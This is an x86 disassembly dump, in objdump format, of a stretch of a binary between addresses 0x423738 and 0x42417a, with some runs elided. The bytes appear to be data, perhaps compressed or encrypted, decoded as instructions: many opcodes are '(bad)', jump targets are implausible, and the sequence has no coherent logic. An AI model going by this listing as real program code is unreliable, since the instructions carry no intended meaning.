  423738:	xor    ebp,DWORD PTR [edx+0x46]
  42373b:	(bad)  
  42373c:	jg     0x423706
  42373e:	loopne 0x423748
  423740:	(bad)
  423745:	out    0x91,al
  423747:	rol    BYTE PTR [edi+0x68bea4d1],1
  42374d:	push   esi
  42374e:	push   0x14
  423750:	add    al,0x19
  423752:	test   BYTE PTR [eax],0xba
  423755:	pop    ds
  423756:	leave  
  423757:	xor    DWORD PTR [ebx-0x7a],ebp
  42375a:	push   ebp
  42375b:	adc    eax,0x6e9137d4
  423760:	pop    esp
  423761:	lahf   
  423762:	dec    ecx
  423763:	push   ss
  423764:	xchg   ebp,eax
  423765:	into   
  423766:	xchg   ebp,eax
  423767:	push   ecx
  423768:	fisub  DWORD PTR [esi-0x31]
  42376b:	dec    edi
  42376c:	push   ds
  42376d:	out    dx,al
  42376e:	dec    eax
  42376f:	jae    0x423752
  423771:	rcl    edx,1
  423773:	mov    DWORD PTR [eax],eax
  423775:	and    esi,DWORD PTR [eax-0x3179cf7d]
  42377b:	pop    DWORD PTR [edi-0x6d]
  42377e:	mov    BYTE PTR [esi-0x2599b72c],ch
  423784:	lock xchg ebx,eax
  423786:	and    al,0x67
  423788:	or     eax,0xbd97e8b7
  42378d:	fdivr  DWORD PTR [ebp+0x6]
	...
  4237f3:	add    BYTE PTR [ebx+eiz*1],dh
  4237f6:	jo     0x423795
  4237f8:	ja     0x4237d9
  4237fa:	std    
  4237fb:	stos   DWORD PTR es:[edi],eax
  4237fc:	(bad)  
  4237fd:	sbb    edx,esi
  4237ff:	jmp    0x7a74:0xf49720da
  423806:	add    DWORD PTR [eax],eax
  423808:	add    al,0x1
  42380a:	add    BYTE PTR [eax],al
  42380c:	inc    edx
  42380d:	add    DWORD PTR [ebx-0x4009dc0e],0x26
  423814:	sub    BYTE PTR [ebp+0x75],ah
  423817:	dec    ecx
  423818:	dec    eax
  423819:	cli    
  42381a:	push   ds
  42381b:	pop    ebp
  42381c:	or     eax,DWORD PTR [eax-0x16dfa341]
  423822:	dec    edi
  423823:	cmp    DWORD PTR [esi+0x70db257c],ebx
  423829:	inc    ebp
  42382a:	push   0x9e8c4b98
  42382f:	pop    edi
  423830:	inc    esp
  423831:	jg     0x423843
  423833:	sbb    bl,BYTE PTR [eax-0x34]
  423836:	add    ebx,DWORD PTR [ebx]
  423838:	in     al,dx
  423839:	or     dh,ah
  42383b:	pop    edi
  42383c:	dec    ebx
  42383d:	dec    eax
  42383e:	add    BYTE PTR [esi],cl
  423840:	enter  0x9639,0xb6
  423844:	cmp    DWORD PTR [ebx-0x25],esi
  423847:	fnstenv [esi+0x38]
  42384a:	mov    esi,0xe1ebf39a
  42384f:	push   ebx
  423850:	adc    dh,BYTE PTR ss:[ecx-0x13]
  423854:	repnz hlt 
  423856:	cmp    al,0x61
  423858:	in     al,0x8c
  42385a:	enter  0xf275,0xf9
  42385e:	push   es
  42385f:	out    0x9c,al
  423861:	xchg   ebp,eax
  423862:	fstp   QWORD PTR [esi]
  423864:	mov    ebp,0xa46fe0f2
  423869:	jle    0x4237f3
  42386b:	fdivr  QWORD PTR [esi]
  42386d:	push   esi
  42386e:	inc    edx
  42386f:	mov    BYTE PTR [ebx],0xa7
  423872:	xchg   ecx,eax
  423873:	jge    0x423893
  423875:	(bad)  
  423876:	int    0x17
  423878:	mov    dh,0x2a
  42387a:	inc    eax
  42387b:	fwait
  42387c:	lods   eax,DWORD PTR ds:[esi]
  42387d:	push   cs
  42387e:	cdq    
  42387f:	hlt    
  423880:	rol    DWORD PTR ds:0xb279e07e,cl
  423886:	and    BYTE PTR [edx-0x1cb9a8f8],dh
  42388c:	cld    
  42388d:	inc    esi
  42388e:	mov    es,WORD PTR [edx-0x6e]
  423891:	adc    cl,BYTE PTR [edi]
  423893:	mov    eax,0x967900be
  423898:	adc    al,0x73
  42389a:	ins    BYTE PTR es:[edi],dx
  42389b:	dec    BYTE PTR [ebx]
  42389d:	test   BYTE PTR [eax-0x61],ah
  4238a0:	mov    ds:0x26481ed4,al
  4238a5:	push   0x50
  4238a7:	pop    ebx
  4238a8:	ins    BYTE PTR es:[edi],dx
  4238a9:	jmp    0x3b2d374a
  4238ae:	in     al,dx
  4238af:	and    al,0x8c
  4238b1:	dec    ebx
  4238b2:	xor    DWORD PTR [ecx],edi
  4238b4:	jg     0x423849
  4238b6:	fisubr DWORD PTR [ebx+ecx*1+0x447cf661]
  4238bd:	inc    ebp
  4238be:	add    eax,DWORD PTR [esi]
  4238c0:	mov    eax,0xc10bec2e
  4238c5:	call   DWORD PTR [ecx]
  4238c7:	test   BYTE PTR [ebx-0x4d],ah
  4238ca:	fiadd  WORD PTR [edx-0x5d]
  4238cd:	retf   0x5f70
  4238d0:	cmp    BYTE PTR [ebp+0x18],bh
  4238d3:	pusha  
  4238d4:	loop   0x423913
  4238d6:	sub    al,0xfc
  4238d8:	sub    eax,0xaa5f8c60
  4238dd:	stos   DWORD PTR es:[edi],eax
  4238de:	mov    WORD PTR [edi+0x56806784],ss
  4238e4:	out    0xc9,eax
  4238e6:	pop    ebx
  4238e7:	ja     0x423894
  4238e9:	dec    ecx
  4238ea:	mov    ds:0xfa1f8c8a,al
  4238ef:	and    DWORD PTR [edx-0x42],0xffffffe6
  4238f3:	popf   
  4238f4:	and    eax,0x5fbae6eb
  4238f9:	div    DWORD PTR [edi-0x7f]
  4238fc:	ins    DWORD PTR es:[edi],dx
  4238fd:	pop    ds
  4238fe:	sbb    BYTE PTR [edi+0x11],bl
  423901:	and    DWORD PTR [ecx-0x71],esp
  423904:	lds    ebp,FWORD PTR [ebx]
  423906:	dec    eax
  423907:	xlat   BYTE PTR ds:[ebx]
  423908:	stos   DWORD PTR es:[edi],eax
  423909:	ss hlt 
  42390b:	(bad)  
  42390c:	push   edi
  42390d:	or     edx,ebx
  42390f:	add    BYTE PTR cs:[eax],al
	...
  423972:	add    BYTE PTR [eax],al
  423974:	mov    ah,BYTE PTR [ecx+esi*8-0x4220078]
  42397b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42397c:	push   ecx
  42397d:	sbb    eax,0xcbe52bbd
  423982:	fdivr  DWORD PTR fs:[eax+0x7b]
  423986:	add    DWORD PTR [eax],eax
  423988:	add    al,0x1
  42398a:	add    BYTE PTR [eax],al
  42398c:	xchg   edx,eax
  42398d:	jmp    0x6d97244f
  423992:	je     0xe322d651
  423998:	mov    bh,0x8d
  42399a:	outs   dx,DWORD PTR ds:[esi]
  42399b:	dec    ebp
  42399c:	xchg   ebp,eax
  42399d:	and    edi,DWORD PTR ds:0x7ec469e1
  4239a3:	mov    ds:0x66715414,al
  4239a8:	(bad)  
  4239a9:	outs   dx,DWORD PTR ds:[esi]
  4239aa:	leave  
  4239ab:	dec    ebp
  4239ac:	cmc    
  4239ad:	in     al,0xe1
  4239af:	sub    DWORD PTR [eax+ebx*8],0xc0ee6c81
  4239b6:	loope  0x42394e
  4239b8:	aam    0x96
  4239ba:	mov    cs,WORD PTR [esi-0x1a]
  4239bd:	jge    0x423a0a
  4239bf:	jno    0x4239b6
  4239c1:	adc    al,0x0
  4239c3:	bound  edx,QWORD PTR [ebx-0x393ceb58]
  4239c9:	int    0xfa
  4239cb:	adc    ah,BYTE PTR [esi-0x64f83c63]
  4239d1:	and    ecx,esi
  4239d3:	pop    es
  4239d4:	sub    DWORD PTR [eax],esp
  4239d6:	imul   ebp,DWORD PTR ds:0xafc035c8,0x7f7ec8cd
  4239e0:	or     BYTE PTR [edx],ch
  4239e2:	dec    edx
  4239e3:	jo     0x4239cc
  4239e5:	aaa    
  4239e6:	adc    al,0xcf
  4239e8:	stc    
  4239e9:	jl     0x423a10
  4239eb:	daa    
  4239ec:	and    al,0x3f
  4239ee:	pop    esi
  4239ef:	aad    0x83
  4239f1:	loope  0x4239ec
  4239f3:	mov    bh,0xb2
  4239f5:	mov    esi,ebp
  4239f7:	in     eax,dx
  4239f8:	mov    esi,DWORD PTR [eax]
  4239fa:	and    al,0xa4
  4239fc:	(bad)  
  4239fd:	std    
  4239fe:	xchg   DWORD PTR [ebp-0x23],edi
  423a01:	cmp    al,0x71
  423a03:	mov    al,0x43
  423a05:	xchg   esp,eax
  423a06:	xchg   edx,eax
  423a07:	jns    0x423992
  423a09:	(bad)  
  423a0a:	adc    dh,ch
  423a0c:	aaa    
  423a0d:	jp     0x4239c1
  423a0f:	leave  
  423a10:	cwde   
  423a11:	xchg   ebx,esi
  423a13:	nop
  423a14:	cmp    edx,DWORD PTR [ecx+0x48]
  423a17:	retf   0x417b
  423a1a:	sub    al,0xe6
  423a1c:	push   0xc450ac2b
  423a21:	inc    al
  423a23:	sbb    BYTE PTR [ebp-0x5a],0x94
  423a27:	xchg   DWORD PTR [ecx-0x41da70c2],esi
  423a2d:	or     DWORD PTR fs:[ebp-0x437a183a],esi
  423a34:	out    dx,al
  423a35:	outs   dx,DWORD PTR ds:[esi]
  423a36:	inc    eax
  423a37:	or     al,0x1b
  423a39:	stos   BYTE PTR es:[edi],al
  423a3a:	mov    ch,0xc
  423a3c:	add    edi,DWORD PTR [ebx-0x38]
  423a3f:	lea    eax,[edx+0x58e7496a]
  423a45:	mov    edi,0xac313e6f
  423a4a:	cwde   
  423a4b:	jmp    0xf2887b5c
  423a50:	ficomp WORD PTR [ecx-0x3c]
  423a53:	in     eax,0xb4
  423a55:	mov    WORD PTR [esi-0x6d],ss
  423a58:	adc    al,0x85
  423a5a:	ds cwde 
  423a5c:	adc    bl,dh
  423a5e:	in     eax,dx
  423a5f:	sbb    BYTE PTR [ebx-0x2940fe98],al
  423a65:	fild   DWORD PTR [esi]
  423a67:	outs   dx,DWORD PTR ds:[esi]
  423a68:	inc    eax
  423a69:	addr16 mov ch,0xe2
  423a6c:	sub    dh,BYTE PTR [esi-0x530fc979]
  423a72:	fsubrp st(4),st
  423a74:	outs   dx,DWORD PTR ds:[esi]
  423a75:	loopne 0x423a0b
  423a77:	inc    esp
  423a78:	sbb    DWORD PTR [ebx-0x68],edx
  423a7b:	fisubr WORD PTR [ebx]
  423a7d:	and    DWORD PTR [edi+0x25],ecx
  423a80:	int3   
  423a81:	loopne 0x423a76
  423a83:	pusha  
  423a84:	jmp    0x84f27e15
  423a89:	sub    al,0x1a
  423a8b:	jae    0x423a92
  423a8d:	jno    0x423a4f
  423a8f:	out    dx,al
	...
  423af4:	xor    BYTE PTR ds:0xdf7d9f75,bh
  423afa:	cli    
  423afb:	mov    edi,0x60851ed8
  423b00:	dec    ebx
  423b01:	mov    ecx,0x7c7c9ca2
  423b06:	add    DWORD PTR [eax],eax
  423b08:	add    al,0x1
  423b0a:	add    BYTE PTR [eax],al
  423b0c:	daa    
  423b0d:	mov    dl,BYTE PTR fs:[ebp+0x71de45af]
  423b14:	jecxz  0x423b18
  423b16:	sub    eax,0x6bbbf232
  423b1b:	into   
  423b1c:	gs ret 
  423b1e:	ja     0x423b4f
  423b20:	sbb    edx,ecx
  423b22:	xchg   ecx,eax
  423b23:	adc    edi,esi
  423b25:	out    dx,eax
  423b26:	fwait
  423b27:	js     0x423b2a
  423b29:	inc    edx
  423b2a:	inc    ebp
  423b2b:	sahf   
  423b2c:	js     0x423b65
  423b2e:	add    DWORD PTR [ebp+0x755ba211],esi
  423b34:	xor    ah,BYTE PTR [ebx]
  423b36:	mov    eax,0x16982c33
  423b3b:	stos   DWORD PTR es:[edi],eax
  423b3c:	fisttp WORD PTR [ebp+ecx*2-0xf]
  423b40:	mov    ch,0x21
  423b42:	sti    
  423b43:	inc    ebp
  423b44:	jl     0x423ac6
  423b46:	xlat   BYTE PTR ds:[ebx]
  423b47:	lods   al,BYTE PTR ds:[esi]
  423b48:	fimul  WORD PTR [esp+ebx*8]
  423b4b:	(bad)  
  423b4c:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423b4e:	mov    eax,0xa9d74afd
  423b53:	div    DWORD PTR [ebx]
  423b55:	out    dx,al
  423b56:	pop    eax
  423b57:	std    
  423b58:	push   ecx
  423b59:	mov    eax,esi
  423b5b:	in     eax,dx
  423b5c:	xor    al,0x7d
  423b5e:	mov    esp,0xf9799d6d
  423b63:	ins    DWORD PTR es:[edi],dx
  423b64:	scas   eax,DWORD PTR es:[edi]
  423b65:	mov    ecx,0xc00e9ef4
  423b6a:	lahf   
  423b6b:	out    0x3c,al
  423b6d:	mov    esp,ds
  423b6f:	mov    fs,WORD PTR [eax]
  423b71:	jne    0x423b3e
  423b73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423b74:	mov    bl,BYTE PTR [ecx]
  423b76:	je     0x423b3a
  423b78:	ror    DWORD PTR [eax],cl
  423b7a:	out    dx,al
  423b7b:	jae    0x423b63
  423b7d:	js     0x423b6b
  423b7f:	cmp    dh,BYTE PTR [eax]
  423b81:	loopne 0x423b63
  423b83:	iret   
  423b84:	pop    ss
  423b85:	lods   eax,DWORD PTR ds:[esi]
  423b86:	repz sub al,0xe7
  423b89:	mov    dh,0xaa
  423b8b:	push   cs
  423b8c:	push   eax
  423b8d:	pop    ecx
  423b8e:	push   0xfffffff8
  423b90:	mov    al,ds:0x3fc7171f
  423b95:	and    eax,0xd7f31571
  423b9a:	and    DWORD PTR [edx-0x5f],ebx
  423b9d:	jae    0x423b57
  423b9f:	mov    ebx,0xd67b9f70
  423ba4:	ds push ebp
  423ba6:	div    DWORD PTR [edi+0x50]
  423ba9:	inc    edx
  423baa:	mov    ebp,0x4fb46ad1
  423baf:	dec    ecx
  423bb0:	idiv   BYTE PTR [eax+edx*4]
  423bb3:	dec    ebp
  423bb4:	xchg   DWORD PTR ds:0x9cbb38e6,ecx
  423bba:	xor    eax,0xabcd3cc0
  423bbf:	adc    BYTE PTR [ebp+0x3f],0x1c
  423bc3:	push   ebp
  423bc4:	lods   eax,DWORD PTR ds:[esi]
  423bc5:	xchg   ebx,eax
  423bc6:	jmp    0x1dbac08
  423bcb:	out    0x28,al
  423bcd:	and    BYTE PTR ds:0xec7a0fb6,bl
  423bd3:	sub    ecx,DWORD PTR [edx]
  423bd5:	jae    0x423b91
  423bd7:	sbb    DWORD PTR [ebp+0x1afb05c2],eax
  423bdd:	fidiv  DWORD PTR [ecx-0x26c73ad]
  423be3:	fbld   TBYTE PTR [ecx]
  423be5:	out    dx,eax
  423be6:	jne    0x423be3
  423be8:	jp     0x423bf4
  423bea:	mov    ch,0x53
  423bec:	mov    al,0xc0
  423bee:	into   
  423bef:	rcr    bl,cl
  423bf1:	jbe    0x423bc5
  423bf3:	test   bl,ah
  423bf5:	scas   al,BYTE PTR es:[edi]
  423bf6:	lahf   
  423bf7:	in     eax,0xd3
  423bf9:	jecxz  0x423bca
  423bfb:	push   esi
  423bfc:	inc    edx
  423bfd:	cs ja  0x423bd3
  423c00:	adc    dh,bl
  423c02:	loope  0x423b98
  423c04:	loopne 0x423bae
  423c06:	int3   
  423c07:	and    al,0xcd
  423c09:	mov    edx,0xa1a320d5
  423c0e:	mov    ds:0x11,eax
	...
  423c73:	add    ch,bh
  423c75:	(bad)  
  423c76:	test   eax,0xff57ab46
  423c7b:	call   FWORD PTR [eax-0x34bb99e9]
  423c81:	mov    cl,ch
  423c83:	inc    ebx
  423c84:	cmp    BYTE PTR [ebp+0x1],0x0
  423c88:	add    al,0x1
  423c8a:	add    BYTE PTR [eax],al
  423c8c:	iret   
  423c8d:	xchg   DWORD PTR [edx+0x31],edi
  423c90:	cwde   
  423c91:	inc    ebx
  423c92:	cdq    
  423c93:	es xor eax,0xa5825ed5
  423c99:	(bad)  
  423c9a:	js     0x423cef
  423c9c:	and    edx,DWORD PTR [edx]
  423c9e:	rol    DWORD PTR [esi],0xeb
  423ca1:	add    ecx,DWORD PTR [edi-0x71]
  423ca4:	adc    al,0x2d
  423ca6:	sub    al,0x48
  423ca8:	adc    bh,BYTE PTR [edx]
  423caa:	mov    esp,0x653fe93c
  423caf:	test   DWORD PTR [ecx],0x3b83d11b
  423cb5:	mov    cl,0x18
  423cb7:	stos   BYTE PTR es:[edi],al
  423cb8:	in     al,0x45
  423cba:	mov    ds:0xd161f874,al
  423cbf:	pop    ss
  423cc0:	clc    
  423cc1:	daa    
  423cc2:	cmp    eax,0x1f82cafc
  423cc7:	ja     0x423d11
  423cc9:	pop    es
  423cca:	out    dx,eax
  423ccb:	sub    eax,0xf28649f3
  423cd0:	idiv   BYTE PTR [esi+0x1d]
  423cd3:	sub    al,0x1a
  423cd5:	loope  0x423d54
  423cd7:	or     ecx,DWORD PTR [esi]
  423cd9:	repz or ah,BYTE PTR [esi]
  423cdc:	jmp    0xffbedc
  423ce1:	leave  
  423ce2:	dec    edx
  423ce3:	cmp    al,0x62
  423ce5:	ret    0xec29
  423ce8:	cmp    DWORD PTR [esi-0x3a],ebx
  423ceb:	cdq    
  423cec:	pushf  
  423ced:	ficom  WORD PTR [edi+0x1a944b6e]
  423cf3:	imul   esi,DWORD PTR [edi+0x2518dba2],0x1d
  423cfa:	xchg   ebx,eax
  423cfb:	pop    ss
  423cfc:	(bad)  
  423cfd:	xor    bh,BYTE PTR ds:0xff16e6dc
  423d03:	pop    ebx
  423d04:	pop    ecx
  423d05:	pop    ecx
  423d06:	add    eax,0xed69a072
  423d0b:	(bad)  
  423d0c:	fstp   QWORD PTR [edi-0x70a07bc1]
  423d12:	push   cs
  423d13:	pushf  
  423d14:	dec    esi
  423d15:	add    esi,DWORD PTR [esi-0x60afb200]
  423d1b:	retf   
  423d1c:	les    eax,FWORD PTR [esi+0x4f]
  423d1f:	adc    BYTE PTR [esi-0x345570e],al
  423d25:	jg     0x423d60
  423d27:	out    0x1a,eax
  423d29:	mov    cl,0xb8
  423d2b:	push   edi
  423d2c:	lods   eax,DWORD PTR ds:[esi]
  423d2d:	adc    esp,eax
  423d2f:	mov    al,ds:0xa4da44a0
  423d34:	jle    0x423d06
  423d36:	pop    edi
  423d37:	mov    ebp,0x8e95e1c1
  423d3c:	fisubr DWORD PTR [ebp-0x25]
  423d3f:	jmp    0xef33:0xc082
  423d45:	ds cld 
  423d47:	jmp    0xaaba3631
  423d4c:	add    BYTE PTR [eax*2+0x5951ec12],0xb8
  423d54:	stos   DWORD PTR es:[edi],eax
  423d55:	xchg   bl,al
  423d57:	dec    ebx
  423d58:	mov    ecx,0xafd8aa6f
  423d5d:	mov    cs,ebp
  423d5f:	in     eax,dx
  423d60:	adc    DWORD PTR [edx],ecx
  423d62:	ret    
  423d63:	push   ss
  423d64:	int3   
  423d65:	push   ecx
  423d66:	fwait
  423d67:	popa   
  423d68:	cmp    ch,0xb4
  423d6b:	or     ch,BYTE PTR [edx-0x55b2ee19]
  423d71:	dec    edi
  423d72:	pop    ecx
  423d73:	outs   dx,BYTE PTR ds:[esi]
  423d74:	stc    
  423d75:	jne    0x423d04
  423d77:	lahf   
  423d78:	sub    al,BYTE PTR [edi]
  423d7a:	stc    
  423d7b:	jmp    0xc41d7b79
  423d80:	fidiv  WORD PTR [ebx]
  423d82:	jle    0x423e03
  423d84:	int    0x6
  423d86:	addr16 inc eax
  423d88:	mov    edi,eax
  423d8a:	ds xchg ecx,eax
  423d8c:	jmp    0xba3a31
	...
  423df1:	add    BYTE PTR [eax],al
  423df3:	add    BYTE PTR [edx-0xa],ah
  423df6:	xchg   DWORD PTR [ecx],ecx
  423df8:	xchg   edi,eax
  423df9:	jns    0x423de9
  423dfb:	jmp    DWORD PTR [edi]
  423dfd:	mov    DWORD PTR [eax-0x5c821a2e],esp
  423e03:	xor    al,BYTE PTR [esi+edi*2+0x1040001]
  423e0a:	add    BYTE PTR [eax],al
  423e0c:	cmc    
  423e0d:	ret    
  423e0e:	sbb    al,0x2e
  423e10:	(bad)  
  423e11:	mov    edx,0x7ee00465
  423e16:	test   edx,0xc120d255
  423e1c:	xor    eax,0xd7d6f368
  423e21:	cmp    esi,DWORD PTR [ecx+0x6dca2138]
  423e27:	sbb    edi,DWORD PTR [edi+ecx*4+0x65674d98]
  423e2e:	mov    esi,0xfcb1c9c4
  423e33:	aaa    
  423e34:	cmp    eax,0x89944800
  423e39:	lock dec ecx
  423e3b:	aas    
  423e3c:	push   es
  423e3d:	(bad)  
  423e3e:	in     eax,dx
  423e3f:	lea    edx,[edx+0x3f]
  423e42:	cmc    
  423e43:	xor    esp,esp
  423e45:	lea    esi,[eax+ebp*4]
  423e48:	push   cs
  423e49:	jae    0x423e47
  423e4b:	push   eax
  423e4c:	dec    ebx
  423e4d:	xor    ecx,ebp
  423e4f:	xor    al,0x4e
  423e51:	pop    es
  423e52:	das    
  423e53:	dec    esp
  423e54:	repnz test al,0x71
  423e57:	fcomp  DWORD PTR [eax]
  423e59:	and    DWORD PTR [edx-0x2923625],edx
  423e5f:	add    eax,0xdddcee03
  423e64:	or     ah,BYTE PTR [edi+0x41]
  423e67:	scas   al,BYTE PTR es:[edi]
  423e68:	add    BYTE PTR [edx+eax*2],ah
  423e6b:	push   0xffffffb6
  423e6d:	(bad)  
  423e6e:	jecxz  0x423e07
  423e70:	out    dx,al
  423e71:	adc    al,0xec
  423e73:	popa   
  423e74:	cmc    
  423e75:	or     DWORD PTR [eax+ebp*4],ecx
  423e78:	xor    dl,BYTE PTR [edi-0x79a7642d]
  423e7e:	lods   eax,DWORD PTR ds:[esi]
  423e7f:	fimul  WORD PTR [eax+0x4dad13e2]
  423e85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423e86:	fucompp 
  423e88:	lock push ss
  423e8a:	inc    ebx
  423e8b:	add    eax,edx
  423e8d:	int3   
  423e8e:	int    0xd8
  423e90:	es test ecx,edi
  423e93:	inc    ebp
  423e94:	sub    al,0x5d
  423e96:	cmp    ah,ah
  423e98:	push   ss
  423e99:	js     0x423e2d
  423e9b:	outs   dx,DWORD PTR ds:[esi]
  423e9c:	(bad)  
  423e9d:	jbe    0x423ece
  423e9f:	dec    esp
  423ea0:	sbb    eax,0xbfaef326
  423ea5:	xchg   esp,eax
  423ea6:	ss loope 0x423eb8
  423ea9:	and    dh,ch
  423eab:	or     DWORD PTR [ecx+ebp*4+0x62],ebp
  423eaf:	mov    esi,0xfddc30a6
  423eb4:	pop    esi
  423eb6:	add    DWORD PTR [edi],eax
  423eb8:	adc    esi,DWORD PTR [edx]
  423eba:	outs   dx,DWORD PTR ds:[esi]
  423ebb:	in     al,0xf5
  423ebd:	mov    DWORD PTR [esi+0x1f],edi
  423ec0:	mov    esp,0xb6b4734b
  423ec5:	cmp    esi,0xffffffcd
  423ec8:	fimul  WORD PTR [esi-0x2d]
  423ecb:	inc    eax
  423ecc:	stos   BYTE PTR es:[edi],al
  423ecd:	xchg   ecx,eax
  423ece:	ret    0xc512
  423ed1:	cmp    eax,0x88308cd5
  423ed6:	ins    DWORD PTR es:[edi],dx
  423ed7:	pop    DWORD PTR [eax+0x10]
  423eda:	ds pop esi
  423edc:	xchg   ebx,eax
  423edd:	pop    edi
  423ede:	ror    BYTE PTR [ebx],cl
  423ee0:	sbb    ebx,0xe35dc514
  423ee6:	addr16 jb 0x423f17
  423ee9:	daa    
  423eea:	pop    ebx
  423eeb:	jb     0x423f2c
  423eed:	pop    ss
  423eee:	push   cs
  423eef:	iret   
  423ef0:	cmc    
  423ef1:	popa   
  423ef2:	mov    dh,0x5f
  423ef4:	inc    edi
  423ef5:	shl    BYTE PTR [edx],cl
  423ef7:	mov    ebp,0xdf12439b
  423efc:	sbb    eax,0xd193fa56
  423f01:	rcl    DWORD PTR [ecx],cl
  423f03:	jl     0x423f34
  423f05:	cld    
  423f06:	ins    DWORD PTR es:[edi],dx
  423f07:	or     esi,DWORD PTR [edx+edx*1+0x62]
  423f0b:	sub    DWORD PTR [eax+0x5f87c3],edx
	...
  423f71:	add    BYTE PTR [eax],al
  423f73:	add    BYTE PTR [esi+0x74b9649a],ch
  423f79:	(bad)  
  423f7a:	call   FWORD PTR [edi-0x26e369ec]
  423f80:	jg     0x423f96
  423f82:	jnp    0x423f50
  423f84:	mov    BYTE PTR [edi+0x1],bh
  423f87:	add    BYTE PTR [ecx+eax*1],al
  423f8a:	add    BYTE PTR [eax],al
  423f8c:	push   0x4258ec10
  423f91:	inc    eax
  423f92:	mov    eax,0x8b4f86bc
  423f97:	cld    
  423f98:	jmp    0x423f51
  423f9a:	jmp    0xa7ae4058
  423f9f:	mov    bl,0x3c
  423fa1:	or     eax,ebp
  423fa3:	jge    0x424022
  423fa5:	pop    ecx
  423fa6:	add    cl,bl
  423fa8:	inc    edi
  423fa9:	pop    ds
  423faa:	int3   
  423fab:	les    eax,FWORD PTR [ebp-0x52396ce5]
  423fb1:	cwde   
  423fb2:	test   eax,0x525721ae
  423fb7:	xchg   ebp,eax
  423fb8:	add    al,0x1c
  423fba:	(bad)  
  423fbb:	inc    DWORD PTR [edx-0x3b3fc628]
  423fc1:	(bad)  
  423fc2:	out    dx,al
  423fc3:	jbe    0x423fd2
  423fc5:	ret    
  423fc6:	lahf   
  423fc7:	in     al,0x83
  423fc9:	push   eax
  423fca:	xchg   esi,eax
  423fcb:	imul   ebp,DWORD PTR [edi-0x3a],0xffffffe1
  423fcf:	mov    dl,0x7f
  423fd1:	cs jmp 0xeb05e9a7
  423fd7:	stos   BYTE PTR es:[edi],al
  423fd8:	xchg   esp,eax
  423fd9:	fild   QWORD PTR [esi+ebx*2+0x19]
  423fdd:	cs pop edx
  423fdf:	inc    edi
  423fe0:	sar    BYTE PTR [ebx+0x58],cl
  423fe3:	lods   al,BYTE PTR ds:[esi]
  423fe4:	test   eax,0xe3016b03
  423fe9:	stos   DWORD PTR es:[edi],eax
  423fea:	mov    ah,BYTE PTR [ecx]
  423fec:	int    0xe7
  423fee:	or     dl,cl
  423ff0:	rcr    DWORD PTR [esi+eiz*8+0x67f289ad],1
  423ff7:	idiv   BYTE PTR [ebx+0x21b66c92]
  423ffd:	loopne 0x423f95
  423fff:	push   ecx
  424000:	jmp    0x2a04ef1c
  424005:	inc    esi
  424006:	sbb    eax,ebx
  424008:	push   edx
  424009:	xor    DWORD PTR [eax],0xc528931d
  42400f:	add    DWORD PTR [edx+0x60],esp
  424012:	lds    ecx,FWORD PTR [edx+0x77]
  424015:	retf   
  424016:	or     BYTE PTR [edi+0x20],ch
  424019:	adc    bl,dh
  42401b:	cmp    DWORD PTR [ebp+0x4eafe736],ebx
  424021:	out    0xa2,al
  424023:	pop    ss
  424024:	mov    ebp,DWORD PTR [esi+edx*8+0x6971ef0]
  42402b:	out    0x8a,al
  42402d:	sbb    dh,ch
  42402f:	push   0x23
  424031:	add    eax,0xafe57e00
  424036:	push   0x60
  424038:	dec    edx
  424039:	pop    ebp
  42403a:	add    al,0xce
  42403c:	in     eax,dx
  42403d:	mov    ebx,0x177cd76
  424042:	jnp    0x424086
  424044:	ins    BYTE PTR es:[edi],dx
  424045:	into   
  424046:	sub    dl,BYTE PTR [esi-0x4f255536]
  42404c:	and    bh,bl
  42404e:	ds pop es
  424050:	xor    eax,0x1de51b6a
  424055:	sbb    al,0xf6
  424057:	jnp    0x4240c7
  424059:	inc    ecx
  42405a:	sbb    eax,0xa8befbc0
  42405f:	add    ecx,DWORD PTR [ebx]
  424061:	neg    BYTE PTR ds:[eax+eax*8-0x1334838e]
  424069:	sbb    eax,0xc7985be1
  42406e:	mov    cl,dh
  424070:	add    BYTE PTR [edx],cl
  424072:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424073:	jbe    0x4240ee
  424075:	mov    WORD PTR [edi-0x5],?
  424078:	mov    edx,0xa31360ff
  42407d:	or     DWORD PTR ds:0xc22e081,ecx
  424083:	test   al,0x8b
  424085:	je     0x42403b
  424087:	push   ss
  424088:	sahf   
  424089:	push   0xffffffc1
  42408b:	shl    DWORD PTR [ebx],0x16
  42408e:	cmp    DWORD PTR [esi+0x0],0x0
	...
  4240f1:	add    BYTE PTR [eax],al
  4240f3:	add    BYTE PTR [eax+ebx*2+0x2e],bh
  4240f7:	mov    cl,0x2e
  4240f9:	idiv   edi
  4240fb:	(bad)  
  4240fd:	jne    0x4240c6
  4240ff:	iret   
  424100:	arpl   dx,sp
  424102:	xor    ebp,DWORD PTR [esp+ecx*4+0x4000180]
  424109:	add    DWORD PTR [eax],eax
  42410b:	add    al,ch
  42410d:	adc    bl,BYTE PTR [ebx+eax*1-0x71e3ce52]
  424114:	cmp    dh,dh
  424116:	adc    esp,eax
  424118:	in     al,dx
  424119:	pop    ebx
  42411a:	fs leave 
  42411c:	and    DWORD PTR [eax-0x760bcc28],ecx
  424122:	jl     0x42414b
  424124:	(bad)  
  424125:	xchg   ebp,eax
  424126:	push   esp
  424127:	icebp  
  424128:	lds    edi,FWORD PTR [ebp-0x4a398e91]
  42412e:	mov    bl,0xa7
  424130:	adc    al,0xfb
  424132:	mov    cl,0xac
  424134:	pop    ss
  424135:	mov    ecx,0x82bafd71
  42413a:	xor    DWORD PTR [ecx],0x353220f5
  424140:	rcl    DWORD PTR ds:0x109497d2,0x41
  424147:	rcl    DWORD PTR [edx],cl
  424149:	fs adc al,0xd0
  42414c:	pusha  
  42414d:	push   0xffffffed
  42414f:	scas   al,BYTE PTR es:[edi]
  424150:	or     DWORD PTR [eax],0xc6530dda
  424156:	cmp    esi,DWORD PTR [ebx]
  424158:	xor    BYTE PTR [esi+0x7776f1a4],ch
  42415e:	and    DWORD PTR ds:[esi],ebp
  424161:	adc    BYTE PTR [eax],dl
  424163:	sahf   
  424164:	mov    ebx,0x60ff5f94
  424169:	mov    ebp,0xc64fbebe
  42416e:	xchg   edx,eax
  42416f:	mov    bl,0xf8
  424171:	adc    BYTE PTR [edx-0x71],al
  424174:	push   0xbaffbc07
  424179:	dec    edi
  42417a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
